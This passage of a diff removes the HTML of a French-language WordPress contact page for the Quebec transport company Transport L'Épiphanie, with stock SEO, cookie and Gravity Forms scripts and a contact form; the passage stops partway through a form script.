@@ -1,422 +1,51 @@
-
-<!doctype html>
-<html lang="fr-FR">
-
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-<script type="text/javascript">
-/* <![CDATA[ */
- var gform;gform||(document.addEventListener("gform_main_scripts_loaded",function(){gform.scriptsLoaded=!0}),window.addEventListener("DOMContentLoaded",function(){gform.domLoaded=!0}),gform={domLoaded:!1,scriptsLoaded:!1,initializeOnLoaded:function(o){gform.domLoaded&&gform.scriptsLoaded?o():!gform.domLoaded&&gform.scriptsLoaded?window.addEventListener("DOMContentLoaded",o):document.addEventListener("gform_main_scripts_loaded",o)},hooks:{action:{},filter:{}},addAction:function(o,n,r,t){gform.addHook("action",o,n,r,t)},addFilter:function(o,n,r,t){gform.addHook("filter",o,n,r,t)},doAction:function(o){gform.doHook("action",o,arguments)},applyFilters:function(o){return gform.doHook("filter",o,arguments)},removeAction:function(o,n){gform.removeHook("action",o,n)},removeFilter:function(o,n,r){gform.removeHook("filter",o,n,r)},addHook:function(o,n,r,t,i){null==gform.hooks[o][n]&&(gform.hooks[o][n]=[]);var e=gform.hooks[o][n];null==i&&(i=n+"_"+e.length),gform.hooks[o][n].push({tag:i,callable:r,priority:t=null==t?10:t})},doHook:function(n,o,r){var t;if(r=Array.prototype.slice.call(r,1),null!=gform.hooks[n][o]&&((o=gform.hooks[n][o]).sort(function(o,n){return o.priority-n.priority}),o.forEach(function(o){"function"!=typeof(t=o.callable)&&(t=window[t]),"action"==n?t.apply(null,r):r[0]=t.apply(null,r)})),"filter"==n)return r[0]},removeHook:function(o,n,t,i){var r;null!=gform.hooks[o][n]&&(r=(r=gform.hooks[o][n]).filter(function(o,n,r){return!!(null!=i&&i!=o.tag||null!=t&&t!=o.priority)}),gform.hooks[o][n]=r)}}); 
-/* ]]> */
-</script>
-
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
-	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
-	<link rel="alternate" hreflang="en" href="https://transportlepiphanie.ca/en/contact/" />
-<link rel="alternate" hreflang="fr" href="https://transportlepiphanie.ca/contact/" />
-<link rel="alternate" hreflang="x-default" href="https://transportlepiphanie.ca/contact/" />
-<script id="cookieyes" type="text/javascript" src="https://cdn-cookieyes.com/client_data/1c3be0c382bbb2e570012742/script.js"></script>
-	<!-- This site is optimized with the Yoast SEO plugin v24.0 - https://yoast.com/wordpress/plugins/seo/ -->
-	<title>Emploi en transport spécialisé | Transport L’Épiphanie Contactez-nous</title>
-	<meta name="description" content="Contactez-nous pour toute question sur nos services ou pour planifier un transport spécialisé.Service 7 jours par semaine, 24 heures par jour." />
-	<link rel="canonical" href="https://transportlepiphanie.ca/contact/" />
-	<meta property="og:locale" content="fr_FR" />
-	<meta property="og:type" content="article" />
-	<meta property="og:title" content="Emploi en transport spécialisé | Transport L’Épiphanie Contactez-nous" />
-	<meta property="og:description" content="Contactez-nous pour toute question sur nos services ou pour planifier un transport spécialisé.Service 7 jours par semaine, 24 heures par jour." />
-	<meta property="og:url" content="https://transportlepiphanie.ca/contact/" />
-	<meta property="og:site_name" content="Transport L’Épiphanie" />
-	<meta property="article:modified_time" content="2023-03-24T18:43:55+00:00" />
-	<meta name="twitter:card" content="summary_large_image" />
-	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://transportlepiphanie.ca/contact/","url":"https://transportlepiphanie.ca/contact/","name":"Emploi en transport spécialisé | Transport L’Épiphanie Contactez-nous","isPartOf":{"@id":"https://transportlepiphanie.ca/#website"},"datePublished":"2022-12-10T01:36:12+00:00","dateModified":"2023-03-24T18:43:55+00:00","description":"Contactez-nous pour toute question sur nos services ou pour planifier un transport spécialisé.Service 7 jours par semaine, 24 heures par jour.","inLanguage":"fr-FR","potentialAction":[{"@type":"ReadAction","target":["https://transportlepiphanie.ca/contact/"]}]},{"@type":"WebSite","@id":"https://transportlepiphanie.ca/#website","url":"https://transportlepiphanie.ca/","name":"Transport L’Épiphanie","description":"","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://transportlepiphanie.ca/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"fr-FR"}]}</script>
-	<!-- / Yoast SEO plugin. -->
-
-
-<style id='classic-theme-styles-inline-css' type='text/css'>
-/*! This file is auto-generated */
-.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
-</style>
-<style id='global-styles-inline-css' type='text/css'>
-:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
-:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
-:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
-:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
-</style>
-<script type="text/javascript" id="wpml-cookie-js-extra">
-/* <![CDATA[ */
-var wpml_cookies = {"wp-wpml_current_language":{"value":"fr","expires":1,"path":"\/"}};
-var wpml_cookies = {"wp-wpml_current_language":{"value":"fr","expires":1,"path":"\/"}};
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://transportlepiphanie.ca/wp-content/plugins/sitepress-multilingual-cms/res/js/cookies/language-cookie.js" id="wpml-cookie-js" defer="defer" data-wp-strategy="defer"></script>
-<meta name="generator" content="WPML ver:4.6.14 stt:1,4;" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/apple-touch-icon.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/favicon-32x32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/favicon-16x16.png">
-  <link rel="manifest" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/site.webmanifest">
-  <link rel="mask-icon" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
-  <link rel="shortcut icon" href="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/favicon.ico">
-  <meta name="msapplication-TileColor" content="#ffffff">
-  <meta name="msapplication-config" content="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/favicon/browserconfig.xml">
-  <meta name="theme-color" content="#ffffff">
-
-  <link rel='stylesheet' href='https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/styles/main.css?id=aec8eb1b653ddb5cf432f457c7dd7f20' type='text/css' media='all'/>
-
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@400;500;700&family=Open+Sans:wght@400;700&display=swap" rel="stylesheet">
-</head>
-
-<body class="wp-singular page-template page-template-template-formulaire page-template-template-formulaire-php page page-id-88 wp-theme-epiphanie pt-[112px]">
-
-  <header id="site-header" class="border-b border-solid border-black py-[1rem] h-[112px] fixed top-0 left-0 w-full bg-white z-50" x-data="{ open: false }">
-  <div class="container-1220-px">
-    <div class="flex items-center justify-between  relative">
-
-      <a href="https://transportlepiphanie.ca" class=" block w-[140px]">
-        <img src="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/logo.svg" alt="">
-      </a>
-
-      <ul class="items-center gap-x-[1.5rem] hidden lg:flex lg:mt-[16px]">
-        
-          <li class="">
-            <a href="/#services" class="link-nav">
-              <span class="">Services</span>
-            </a>
-          </li>
-
-        
-          <li class="">
-            <a href="/#flotte" class="link-nav">
-              <span class="">Flotte</span>
-            </a>
-          </li>
-
-        
-          <li class="">
-            <a href="/#carriere" class="link-nav">
-              <span class="">Carrière</span>
-            </a>
-          </li>
-
-        
-          <li class="">
-            <a href="#contact" class="link-nav">
-              <span class="">Contact</span>
-            </a>
-          </li>
-
-        
-        <li class="lg:border-l-2 lg:border-solid lg:border-blue-1 lg:pl-[1.5rem]">
-                                    <a class="link-nav" href="https://transportlepiphanie.ca/en/contact/">
-                <span>en</span>
-              </a>
-                                            
-        </li>
-      </ul>
-
-                          <a class="link-login absolute top-[0] right-0 hidden lg:flex" href="https://azur.expressmondor.net:4443/Konek" target="_blank">
-            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 40 40">
-              <g fill="currentColor" clip-path="url(#a)"><path d="M15 17.526c-4.595 0-8.334-3.738-8.334-8.333C6.666 4.598 10.405.859 15 .859s8.333 3.739 8.333 8.334-3.738 8.333-8.333 8.333Zm0-14.167a5.84 5.84 0 0 0-5.834 5.834A5.84 5.84 0 0 0 15 15.026a5.84 5.84 0 0 0 5.833-5.833A5.84 5.84 0 0 0 15 3.359ZM37.083 39.193h-9.166A2.92 2.92 0 0 1 25 36.276v-5.833a2.92 2.92 0 0 1 2.917-2.917h9.166A2.92 2.92 0 0 1 40 30.443v5.833a2.92 2.92 0 0 1-2.917 2.917Zm-9.166-9.167a.417.417 0 0 0-.417.417v5.833c0 .23.187.417.417.417h9.166c.23 0 .417-.187.417-.417v-5.833a.417.417 0 0 0-.417-.417h-9.166Z"/><path d="M35.417 30.026h-5.834c-.69 0-1.25-.56-1.25-1.25v-3.75a4.172 4.172 0 0 1 4.167-4.167 4.172 4.172 0 0 1 4.167 4.167v3.75c0 .69-.56 1.25-1.25 1.25Zm-4.584-2.5h3.334v-2.5a1.67 1.67 0 0 0-1.667-1.667 1.67 1.67 0 0 0-1.666 1.667v2.5ZM20.833 35.86H1.25C.56 35.86 0 35.3 0 34.61v-5.834c0-4.365 3.552-7.917 7.917-7.917H22.5c1.393 0 2.765.369 3.965 1.067a1.25 1.25 0 1 1-1.258 2.16 5.4 5.4 0 0 0-2.707-.727H7.917A5.423 5.423 0 0 0 2.5 28.776v4.583h18.333a1.25 1.25 0 0 1 0 2.5Z"/></g>
-              <defs>
-                <clipPath id="a"><path fill="currentColor" d="M0 0h40v40H0z"/></clipPath>
-              </defs>
-            </svg>
-            <span>Portail employé </span>
-          </a>
-      
-      <button class="hamburger w-[40px] h-[40px] text-blue-1 hover:text-black lg:hidden" @click="open = true">
-        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 40 40">
-          <rect width="40" height="40" fill="currentColor" rx="20"/>
-          <path fill="#fff" d="M27.875 15.875h-15.75A1.105 1.105 0 0 1 11 14.75c0-.637.488-1.125 1.125-1.125h15.75c.637 0 1.125.488 1.125 1.125s-.488 1.125-1.125 1.125ZM27.875 21.125h-15.75A1.105 1.105 0 0 1 11 20c0-.637.488-1.125 1.125-1.125h15.75c.637 0 1.125.488 1.125 1.125s-.488 1.125-1.125 1.125ZM27.875 26.375h-15.75A1.105 1.105 0 0 1 11 25.25c0-.637.488-1.125 1.125-1.125h15.75c.637 0 1.125.488 1.125 1.125s-.488 1.125-1.125 1.125Z"/>
-        </svg>
-      </button>
-
-    </div>
-  </div>
-  <div id="site-menu-mobile" class="bg-blue-1 text-white h-screen fixed top-0 left-0 w-full z-[60]" x-show="open" x-cloak>
-  <div class="px-[24px] border-b border-solid border-white py-[1rem] mb-[24px]">
-    <a href="https://transportlepiphanie.ca" class="block w-[140px]">
-      <img src="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/images/logo-white.svg" alt="">
-    </a>
-  </div>
-
-  <div class="px-[24px] mt-[64px]">
-
-    <ul class=" space-y-[16px]">
-      
-        <li>
-          <a href="/#services" class="link-nav-white">
-            <span class="">Services</span>
-          </a>
-        </li>
-
-      
-        <li>
-          <a href="/#flotte" class="link-nav-white">
-            <span class="">Flotte</span>
-          </a>
-        </li>
-
-      
-        <li>
-          <a href="/#carriere" class="link-nav-white">
-            <span class="">Carrière</span>
-          </a>
-        </li>
-
-      
-        <li>
-          <a href="#contact" class="link-nav-white">
-            <span class="">Contact</span>
-          </a>
-        </li>
-
-      
-      <li>
-                              <a class="link-nav-white" href="https://transportlepiphanie.ca/en/contact/">
-              <span>en</span>
-            </a>
-                                    
-      </li>
-    </ul>
-
-  </div>
-
-  <button aria-label="close" class="w-[24px] transition duration-fast hover:opacity-90 absolute top-[8px] right-[8px]" @click="open = false">
-    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-    <path d="M5.32534 18.4133C5.54188 18.6304 5.82664 18.7387 6.1105 18.7387C6.39451 18.7387 6.67912 18.6304 6.89566 18.4133L12 13.3087L17.1044 18.4133C17.3211 18.6304 17.6057 18.7387 17.8896 18.7387C18.1733 18.7387 18.4579 18.6304 18.6747 18.4133C19.1084 17.9796 19.1084 17.2766 18.6747 16.8429L13.5701 11.7386L18.4128 6.89585C18.8466 6.46232 18.8466 5.75906 18.4128 5.32553C17.9792 4.89169 17.2763 4.89169 16.8424 5.32553L11.9999 10.1681L7.15748 5.32538C6.7238 4.89154 6.02069 4.89154 5.58731 5.32538C5.15348 5.75891 5.15348 6.46217 5.58731 6.8957L10.4299 11.7384L5.32564 16.8428C4.8915 17.2763 4.8915 17.9793 5.32534 18.4133Z" fill="white"/>
-    </svg>
-  </button>
-
-    <a class="link-login bg-black text-white py-[28px] px-[24px] flex justify-center fixed bottom-0 left-0 w-full" href="https://azur.expressmondor.net:4443/Konek" target="_blank">
-      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 40 40">
-        <g fill="currentColor" clip-path="url(#a)"><path d="M15 17.526c-4.595 0-8.334-3.738-8.334-8.333C6.666 4.598 10.405.859 15 .859s8.333 3.739 8.333 8.334-3.738 8.333-8.333 8.333Zm0-14.167a5.84 5.84 0 0 0-5.834 5.834A5.84 5.84 0 0 0 15 15.026a5.84 5.84 0 0 0 5.833-5.833A5.84 5.84 0 0 0 15 3.359ZM37.083 39.193h-9.166A2.92 2.92 0 0 1 25 36.276v-5.833a2.92 2.92 0 0 1 2.917-2.917h9.166A2.92 2.92 0 0 1 40 30.443v5.833a2.92 2.92 0 0 1-2.917 2.917Zm-9.166-9.167a.417.417 0 0 0-.417.417v5.833c0 .23.187.417.417.417h9.166c.23 0 .417-.187.417-.417v-5.833a.417.417 0 0 0-.417-.417h-9.166Z"/><path d="M35.417 30.026h-5.834c-.69 0-1.25-.56-1.25-1.25v-3.75a4.172 4.172 0 0 1 4.167-4.167 4.172 4.172 0 0 1 4.167 4.167v3.75c0 .69-.56 1.25-1.25 1.25Zm-4.584-2.5h3.334v-2.5a1.67 1.67 0 0 0-1.667-1.667 1.67 1.67 0 0 0-1.666 1.667v2.5ZM20.833 35.86H1.25C.56 35.86 0 35.3 0 34.61v-5.834c0-4.365 3.552-7.917 7.917-7.917H22.5c1.393 0 2.765.369 3.965 1.067a1.25 1.25 0 1 1-1.258 2.16 5.4 5.4 0 0 0-2.707-.727H7.917A5.423 5.423 0 0 0 2.5 28.776v4.583h18.333a1.25 1.25 0 0 1 0 2.5Z"/></g>
-        <defs>
-          <clipPath id="a"><path fill="currentColor" d="M0 0h40v40H0z"/></clipPath>
-        </defs>
-      </svg>
-      <span>Portail employé </span>
-    </a>
-
-
-</div>
-
-</header>
-
-  <main id="main-content"> 
-  <section class="container-fluid-px my-[5rem] lg:mb-[7.5rem]">
-
-    <div class="container-1016">
-      <div class="text-center">
-        <h1 class="h1">À votre service!</h1>
-        <div class="wysiwyg wysiwyg-base"><span style="font-weight: 400;">Laissez-nous vos informations et nous vous répondrons dans les plus brefs délais. </span></div>
-      </div>
-      
-            <div class="mt-[5rem]"><script type="text/javascript"></script>
-                <div class='gf_browser_chrome gform_wrapper gravity-theme' id='gform_wrapper_3' ><div id='gf_3' class='gform_anchor' tabindex='-1'></div><form method='post' enctype='multipart/form-data' target='gform_ajax_frame_3' id='gform_3'  action='/contact/#gf_3' novalidate>
-                        <div class='gform_body gform-body'><div id='gform_fields_3' class='gform_fields top_label form_sublabel_below description_below'><div id="field_3_3"  class="gfield gfield--width-half gfield_contains_required field_sublabel_below field_description_below gfield_visibility_visible"  data-js-reload="field_3_3"><label class='gfield_label' for='input_3_3' >Prénom<span class="gfield_required"><span class="gfield_required gfield_required_text">(Nécessaire)</span></span></label><div class='ginput_container ginput_container_text'><input name='input_3' id='input_3_3' type='text' value='' class='large'     aria-required="true" aria-invalid="false"   /> </div></div><div id="field_3_5"  class="gfield gfield--width-half gfield_contains_required field_sublabel_below field_description_below gfield_visibility_visible"  data-js-reload="field_3_5"><label class='gfield_label' for='input_3_5' >Nom<span class="gfield_required"><span class="gfield_required gfield_required_text">(Nécessaire)</span></span></label><div class='ginput_container ginput_container_text'><input name='input_5' id='input_3_5' type='text' value='' class='large'     aria-required="true" aria-invalid="false"   /> </div></div><div id="field_3_6"  class="gfield gfield--width-half gfield_contains_required field_sublabel_below field_description_below gfield_visibility_visible"  data-js-reload="field_3_6"><label class='gfield_label' for='input_3_6' >Courriel<span class="gfield_required"><span class="gfield_required gfield_required_text">(Nécessaire)</span></span></label><div class='ginput_container ginput_container_email'>
-                            <input name='input_6' id='input_3_6' type='email' value='' class='large'    aria-required="true" aria-invalid="false"  />
-                        </div></div><div id="field_3_10"  class="gfield gfield--width-half gfield_contains_required field_sublabel_below field_description_below gfield_visibility_visible"  data-js-reload="field_3_10"><label class='gfield_label' for='input_3_10' >Téléphone<span class="gfield_required"><span class="gfield_required gfield_required_text">(Nécessaire)</span></span></label><div class='ginput_container ginput_container_text'><input name='input_10' id='input_3_10' type='text' value='' class='large'     aria-required="true" aria-invalid="false"   /> </div></div><div id="field_3_9"  class="gfield gfield--width-full gfield_contains_required field_sublabel_below field_description_below gfield_visibility_visible"  data-js-reload="field_3_9"><label class='gfield_label' for='input_3_9' >Message<span class="gfield_required"><span class="gfield_required gfield_required_text">(Nécessaire)</span></span></label><div class='ginput_container ginput_container_textarea'><textarea name='input_9' id='input_3_9' class='textarea large'     aria-required="true" aria-invalid="false"   rows='10' cols='50'></textarea></div></div></div></div>
-        <div class='gform_footer top_label'> <input type='submit' id='gform_submit_button_3' class='gform_button button' value='Envoyer'  onclick='if(window["gf_submitting_3"]){return false;}  if( !jQuery("#gform_3")[0].checkValidity || jQuery("#gform_3")[0].checkValidity()){window["gf_submitting_3"]=true;}  ' onkeypress='if( event.keyCode == 13 ){ if(window["gf_submitting_3"]){return false;} if( !jQuery("#gform_3")[0].checkValidity || jQuery("#gform_3")[0].checkValidity()){window["gf_submitting_3"]=true;}  jQuery("#gform_3").trigger("submit",[true]); }' /> <input type='hidden' name='gform_ajax' value='form_id=3&amp;title=&amp;description=&amp;tabindex=0' />
-            <input type='hidden' class='gform_hidden' name='is_submit_3' value='1' />
-            <input type='hidden' class='gform_hidden' name='gform_submit' value='3' />
-            
-            <input type='hidden' class='gform_hidden' name='gform_unique_id' value='' />
-            <input type='hidden' class='gform_hidden' name='state_3' value='WyJbXSIsIjMwYjgzMzAxMTA0M2FmYmQ0ZjM3MWUzZDNlM2M0MDZlIl0=' />
-            <input type='hidden' class='gform_hidden' name='gform_target_page_number_3' id='gform_target_page_number_3' value='0' />
-            <input type='hidden' class='gform_hidden' name='gform_source_page_number_3' id='gform_source_page_number_3' value='1' />
-            <input type='hidden' name='gform_field_values' value='' />
-            
-        </div>
-                        </form>
-                        </div>
-                <iframe style='display:none;width:0px;height:0px;' src='about:blank' name='gform_ajax_frame_3' id='gform_ajax_frame_3' title='Cette iframe contient la logique nécessaire pour manipuler Gravity Forms avec Ajax.'></iframe>
-                <script type="text/javascript">
-/* <![CDATA[ */
- gform.initializeOnLoaded( function() {gformInitSpinner( 3, 'https://transportlepiphanie.ca/wp-content/plugins/gravityforms/images/spinner.svg' );jQuery('#gform_ajax_frame_3').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_3');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_3').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_3').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_3').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_3').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_3').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_3').val();gformInitSpinner( 3, 'https://transportlepiphanie.ca/wp-content/plugins/gravityforms/images/spinner.svg' );jQuery(document).trigger('gform_page_loaded', [3, current_page]);window['gf_submitting_3'] = false;}else 